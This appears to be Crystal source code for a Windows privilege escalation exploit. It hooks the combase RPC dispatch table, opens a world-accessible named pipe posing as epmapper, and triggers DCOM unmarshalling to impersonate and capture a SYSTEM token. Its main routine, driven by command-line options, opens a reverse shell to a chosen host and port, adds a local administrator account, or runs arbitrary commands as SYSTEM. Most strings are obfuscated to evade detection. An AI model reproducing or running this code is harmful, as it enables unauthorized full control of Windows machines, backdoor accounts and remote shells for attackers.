PIPE_SERVER_THREAD_PROC = ->(param : Pointer(Void)) : UInt32 {
  sb = LibGC::GcStackBase.new(mem_base: Pointer(Void).null)
  LibGC.GC_get_stack_base(pointerof(sb))
  LibGC.GC_register_my_thread(pointerof(sb))

  if ctx = PipeServerBridge.ctx
    ctx.run_pipe_server
  end

  LibGC.GC_unregister_my_thread
  0_u32
}


# ─────────────── MyContext ──────────────────────────────
class MyContext
  getter combase_module : UInt64 = 0_u64
  getter dispatch_table_ptr : UInt64 = 0_u64
  getter use_protseq_function_ptr : UInt64 = 0_u64
  getter use_protseq_param_count : UInt32 = 0_u32

  @dispatch_table = [] of UInt64
  @fmt_string_offset = [] of Int16
  @proc_string : UInt64 = 0_u64
  @is_hooked = false
  @is_started = false
  @thread_handle : Pointer(Void) = Pointer(Void).null
  @system_token : Pointer(Void)? = nil
  @server_pipe : String
  @pipe_name : String
  @log = [] of String

  def initialize(@pipe_name = "Crystal")
    @server_pipe = obf("\\\\.\\pipe\\") + @pipe_name + obf("\\pipe\\epmapper")
    HookState.client_pipe = obf("ncacn_np:localhost/pipe/") + @pipe_name + obf("[\\pipe\\epmapper]")

    init_context

    raise obf("init failed") if @combase_module == 0
    raise obf("init failed") if @dispatch_table.empty? || @proc_string == 0 || @use_protseq_function_ptr == 0
    raise obf("init failed") unless (4..14).includes?(@use_protseq_param_count)
  end

  private def init_context
    combase_base, combase_size = PEWalk.ldr_module(0x56777929_u32)
    return if combase_base == 0

    @combase_module = combase_base
    module_size = combase_size.to_i32

    dll_content = Bytes.new(module_size)
    dll_content.to_unsafe.copy_from(Pointer(UInt8).new(combase_base), module_size)

    rsi_size = sizeof(Ri).to_u32
    pattern_io = IO::Memory.new
    pattern_io.write_bytes(rsi_size, IO::ByteFormat::LittleEndian)
    pattern_io.write(ORCB_GUID_BYTES)
    pattern = pattern_io.to_slice

    offsets = sunday_search(dll_content, pattern)
    return if offsets.empty?

    rsi_addr = @combase_module + offsets[0].to_u64
    rsi = Pointer(Ri).new(rsi_addr).value

    rpc_dt = Pointer(Rd).new(rsi.dispatch_table.address).value
    midl_info = Pointer(Mi).new(rsi.interpreter_info.address).value

    @dispatch_table_ptr = midl_info.dispatch_table.address
    @proc_string = midl_info.proc_string.address
    fmt_offset_ptr = midl_info.fmt_string_offset.address
    count = rpc_dt.dispatch_table_count

    @dispatch_table = [] of UInt64
    count.times do |i|
      ptr_val = Pointer(UInt64).new(@dispatch_table_ptr + i.to_u64 * 8).value
      @dispatch_table << ptr_val
    end

    @fmt_string_offset = [] of Int16
    count.times do |i|
      val = Pointer(Int16).new(fmt_offset_ptr + i.to_u64 * 2).value
      @fmt_string_offset << val
    end

    @use_protseq_function_ptr = @dispatch_table[0]
    offset = @fmt_string_offset[0].to_i64
    addr = (@proc_string.to_i64 + offset + 19).to_u64
    @use_protseq_param_count = Pointer(UInt8).new(addr).value.to_u32
  end

  def hook_rpc
    hook_ptr = HookState.get_hook_pointer(@use_protseq_param_count)

    old_protect = 0_u32
    table_size = (8_u64 * @dispatch_table.size)
    base_addr = Pointer(Void).new(@dispatch_table_ptr)
    region = table_size

    status = SysState.nt_protect_virtual_memory(
      CURRENT_PROCESS, pointerof(base_addr),
      pointerof(region), PAGE_READWRITE,
      pointerof(old_protect))

    dbg obf("[*] vp:0x") + status.unsafe_as(UInt32).to_s(16) + obf(" old:0x") + old_protect.to_s(16)

    if status < 0
      dbg obf("[!] vp fail, fallback")
      WinExtra.VirtualProtect(Pointer(Void).new(@dispatch_table_ptr),
        table_size, PAGE_READWRITE, pointerof(old_protect))
    end

    Pointer(Pointer(Void)).new(@dispatch_table_ptr).value = hook_ptr

    @is_hooked = true
    dbg1 obf("[*] hooked")
  end

  private def log(msg : String)
    @log << msg
  end

  def run_pipe_server
    sddl = obf("D:(A;OICI;GA;;;WD)").to_utf16
    sec_desc = Pointer(Void).null
    sec_desc_size = 0_u32
    dbg obf("[pipe] convert_sd addr=0x") + SysState.dbg_convert_sd.to_s(16)
    dbg obf("[pipe] sddl ptr=0x") + sddl.to_unsafe.address.to_s(16) + " len=" + sddl.size.to_s
    ret = SysState.convert_sd_w(sddl.to_unsafe, 1_u32, pointerof(sec_desc), pointerof(sec_desc_size))
    dbg obf("[pipe] convert_sd_w returned ") + ret.to_s

    sa = SecurityAttributesCR.new(sizeof(SecurityAttributesCR).to_u32, sec_desc, 0)
    dbg obf("[pipe] sa ok, sec_desc=0x") + sec_desc.address.to_s(16)

    pipe_name_w = @server_pipe.to_utf16
    dbg obf("[pipe] cnpw=0x") + SysState.dbg_create_named_pipe_w.to_s(16)
    dbg obf("[pipe] calling CreateNamedPipeW")
    pipe_handle = SysState.create_named_pipe_w(
      pipe_name_w.to_unsafe,
      PIPE_ACCESS_DUPLEX,
      PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
      PIPE_UNLIMITED_INSTANCES,
      521_u32, 0_u32, 123_u32,
      pointerof(sa).as(Pointer(Void)))
    dbg obf("[pipe] handle=0x") + pipe_handle.address.to_s(16)

    log obf("[*] listening ") + @server_pipe

    if pipe_handle == INVALID_HANDLE_VALUE
      log obf("[!] listen err:") + LibC.GetLastError.to_s
      return
    end

    dbg obf("[pipe] calling ConnectNamedPipe")
    is_connect = SysState.connect_named_pipe(pipe_handle, Pointer(Void).null)
    dbg obf("[pipe] connect=") + is_connect.to_s
    last_err = LibC.GetLastError

    if (is_connect != 0 || last_err == ERROR_PIPE_CONNECTED) && @is_started
      log obf("[*] connected")

      imp_ret = SysState.impersonate_named_pipe_client(pipe_handle)
      dbg obf("[imp] impersonate ret=") + imp_ret.to_s
      if imp_ret != 0
        imp_token = Pointer(Void).null
        status = SysState.nt_open_thread_token(
          CURRENT_THREAD,
          TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
          1, pointerof(imp_token))
        dbg obf("[imp] open_thread_token status=0x") + status.unsafe_as(UInt32).to_s(16) + " tok=0x" + imp_token.address.to_s(16)
        imp_token = Pointer(Void).null if status < 0

        current_sid = imp_token.null? ? "?" : (get_token_sid(imp_token) || "?")
        imp_level = imp_token.null? ? -1 : get_impersonation_level(imp_token)

        log obf("[*] sid:") + current_sid + obf(" il:") + imp_level.to_s

        SysState.nt_close(imp_token) unless imp_token.null?

        system_token = find_system_token(@log)
        if system_token
          @system_token = system_token
          log obf("[*] found")
        else
          log obf("[*] not found")
        end

        SysState.revert_to_self
      else
        log obf("[!] err:") + LibC.GetLastError.to_s
      end
    else
      log obf("[!] conn err:") + is_connect.to_s + " " + last_err.to_s
    end

    SysState.nt_close(pipe_handle)
  end

  def start
    raise obf("not ready") unless @is_hooked
    return if @is_started

    @is_started = true
    PipeServerBridge.ctx = self
    tid = 0_u32
    @thread_handle = WinExtra.CreateThread(
      Pointer(Void).null, 0_u64,
      PIPE_SERVER_THREAD_PROC,
      Pointer(Void).null,
      0_u32, pointerof(tid))
    dbg1 obf("[*] started")
  end

  def join_pipe_thread
    unless @thread_handle.null?
      timeout = -1_i64
      SysState.nt_wait_for_single_object(@thread_handle, 0, pointerof(timeout).as(Pointer(Void)))
      SysState.nt_close(@thread_handle)
    end
    @log.each { |msg| dbg1 msg }
    @log.clear
  end

  def restore
    if @is_hooked && @use_protseq_function_ptr != 0
      Pointer(UInt64).new(@dispatch_table_ptr).value = @use_protseq_function_ptr
      @is_hooked = false
    end
  end

  def stop
    if @is_started
      @is_started = false
      begin
        pipe_name_w = @server_pipe.to_utf16
        pipe_client = LibC.CreateFileW(
          pipe_name_w.to_unsafe,
          0xC0000000_u32,
          0x03_u32,
          Pointer(LibC::SECURITY_ATTRIBUTES).null,
          3_u32,
          0_u32, Pointer(Void).null)
        if pipe_client != INVALID_HANDLE_VALUE
          data = StaticArray(UInt8, 1).new(0xAA_u8)
          written = 0_u32
          LibC.WriteFile(pipe_client, data.to_unsafe.as(Pointer(Void)), 1_u32, pointerof(written), Pointer(LibC::OVERLAPPED).null)
          SysState.nt_close(pipe_client)
        end
      rescue
      end
    end
  end

  def get_token : Pointer(Void)?
    @system_token
  end
end


# ─────────────── DCOM Trigger ───────────────────────────
def get_local_objref : ObjRef
  fake_obj = Pointer(Void).null
  hr = Ole32.CreateStreamOnHGlobal(Pointer(Void).null, 1, pointerof(fake_obj))
  raise obf("stream err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0

  hglobal = WinExtra.GlobalAlloc(0x0042_u32, 4096_u64)
  raise obf("alloc err") if hglobal.null?

  out_stream = Pointer(Void).null
  hr = Ole32.CreateStreamOnHGlobal(hglobal, 0, pointerof(out_stream))
  raise obf("stream err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0

  iid = IID_IUNKNOWN.dup
  hr = Ole32.CoMarshalInterface(
    out_stream, iid.to_unsafe.as(Pointer(Void)), fake_obj,
    2_u32, Pointer(Void).null, 0_u32)
  raise obf("marshal err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0

  ptr = WinExtra.GlobalLock(hglobal)
  data = Bytes.new(4096)
  data.to_unsafe.copy_from(ptr.as(Pointer(UInt8)), 4096)
  WinExtra.GlobalUnlock(hglobal)

  ObjRef.parse(data)
end

def trigger_dcom(ctx : MyContext)
  tmp_objref = get_local_objref

  guid_hex = tmp_objref.guid.hexstring
  ipid_hex = tmp_objref.standard_objref.ipid.hexstring
  dbg obf("[*] G:") + guid_hex
  dbg obf("[*] I:") + ipid_hex
  dbg obf("[*] OX:0x") + tmp_objref.standard_objref.oxid.to_s(16)
  dbg obf("[*] OI:0x") + tmp_objref.standard_objref.oid.to_s(16)

  crafted_dsa = DualStringArray.new(
    StringBinding.new(EPM_PROTOCOL_TCP, obf("127.0.0.1")),
    SecurityBinding.new(0x0a_u16, 0xffff_u16))

  crafted_objref = ObjRef.new(
    IID_IUNKNOWN.dup,
    StandardObjRef.new(
      0_u32, 1_u32,
      tmp_objref.standard_objref.oxid,
      tmp_objref.standard_objref.oid,
      tmp_objref.standard_objref.ipid.dup))

  data = crafted_objref.get_bytes(crafted_dsa)
  dbg obf("[*] len:") + data.size.to_s

  hglobal = WinExtra.GlobalAlloc(0x0002_u32, data.size.to_u64)
  raise obf("alloc err") if hglobal.null?
  ptr = WinExtra.GlobalLock(hglobal)
  ptr.as(Pointer(UInt8)).copy_from(data.to_unsafe, data.size)
  WinExtra.GlobalUnlock(hglobal)

  stream = Pointer(Void).null
  hr = Ole32.CreateStreamOnHGlobal(hglobal, 1, pointerof(stream))
  raise obf("stream err:0x") + hr.unsafe_as(UInt32).to_s(16) if hr < 0

  ppv = Pointer(Void).null
  iid = IID_IUNKNOWN.dup
  dbg obf("[*] triggering")
  hr = Ole32.CoUnmarshalInterface(stream, iid.to_unsafe.as(Pointer(Void)), pointerof(ppv))
  dbg obf("[*] result:0x") + hr.unsafe_as(UInt32).to_s(16)
end


# ─────────────── Main ───────────────────────────────────
def main
  command = ""
  pipe_name = obf("Crystal")
  lhost = ""
  lport = 0_u16
  username = ""
  password = ""

  dd_flag = obf("-dd")
  if idx = ARGV.index(dd_flag)
    Config.debug_level = 2
    ARGV.delete_at(idx)
  end

  pw_flag = obf("-pw")
  if idx = ARGV.index(pw_flag)
    if idx + 1 < ARGV.size
      password = ARGV[idx + 1]
      ARGV.delete_at(idx + 1)
    end
    ARGV.delete_at(idx)
  end

  OptionParser.parse do |parser|
    parser.banner = obf("Usage: main.exe [options]")
    parser.on(obf("-c CMD"), obf("--cmd=CMD"), obf("Command / shell")) { |c| command = c }
    parser.on(obf("-p NAME"), obf("--pipe=NAME"), obf("Pipe name")) { |p| pipe_name = p }
    parser.on(obf("-H HOST"), obf("--lhost=HOST"), obf("Reverse shell host")) { |h| lhost = h }
    parser.on(obf("-P PORT"), obf("--lport=PORT"), obf("Reverse shell port")) { |p| lport = p.to_u16 }
    parser.on(obf("-u USER"), obf("--user=USER"), obf("Local admin user")) { |u| username = u }
    parser.on(obf("-d"), obf("Debug")) { Config.debug_level = 1 }
    parser.on(obf("-h"), obf("--help"), obf("Help")) { puts parser; exit }
  end

  has_revshell = !lhost.empty? && lport > 0
  has_adduser = !username.empty? && !password.empty?
  has_command = !command.empty?

  unless has_revshell || has_adduser || has_command
    STDERR.puts obf("[!] -c, -H/-P, or -u/-pw required")
    exit(1)
  end

  SysState.init

  hr = Ole32.CoInitializeEx(Pointer(Void).null, 0_u32)
  if hr < 0
    dbg obf("[!] init err:0x") + hr.unsafe_as(UInt32).to_s(16)
    return
  end

  begin
    ctx = MyContext.new(pipe_name)

    dbg1 obf("[*] base:0x") + ctx.combase_module.to_s(16)
    dbg obf("[*] dt:0x") + ctx.dispatch_table_ptr.to_s(16)
    dbg obf("[*] fn:0x") + ctx.use_protseq_function_ptr.to_s(16)
    dbg obf("[*] pc:") + ctx.use_protseq_param_count.to_s

    ctx.hook_rpc
    ctx.start

    LibC.Sleep(500_u32)

    begin
      trigger_dcom(ctx)
    rescue ex
      dbg obf("[!] ") + (ex.message || "?") unless ex.message == "Arithmetic overflow"
    end

    ctx.join_pipe_thread

    system_token = ctx.get_token
    if system_token
      dbg1 obf("[*] OK")
      if has_revshell
        shell = command.empty? ? obf("cmd.exe") : command
        reverse_shell(system_token, lhost, lport, shell)
      elsif has_adduser
        add_local_admin(system_token, username, password)
      else
        create_process_read_output(system_token, command)
      end
    else
      dbg1 obf("[!] failed")
    end

    ctx.restore
    ctx.stop
  rescue ex
    dbg obf("[!] ") + (ex.message || "?")
  end

  Ole32.CoUninitialize
end


main
